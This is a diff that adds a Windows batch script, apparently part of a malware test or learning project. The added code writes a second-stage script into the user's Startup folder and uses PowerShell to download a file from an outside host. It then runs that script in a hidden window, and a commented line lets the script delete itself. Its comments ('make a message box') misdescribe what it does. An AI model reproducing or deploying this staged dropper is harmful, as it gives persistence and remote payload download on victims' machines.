@@ -15,4 +15,30 @@ make a message box
 @REM cd %currentDirectory%
 
 del initial.bat
+-----------------------------------------------------------------------------------------------------
+
+
+@REM @echo off
+
+SET currentDirectory=%cd%
+echo Current directory: %currentDirectory%
+
+SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd %STARTUPPATH%
+
+
+@REM make a message box
+(
+    powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/next.config.ts' -OutFile 'C:\malware\test\download.txt'"
+) > stage2.cmd
+
+
+@REM run stage2
+Powershell Start-Process powershell.exe -window style hidden "stage2.cmd"
+
+
+cd %currentDirectory%
+
+@rem uncomment to make the script delete itself
+@rem del initial.bat
 
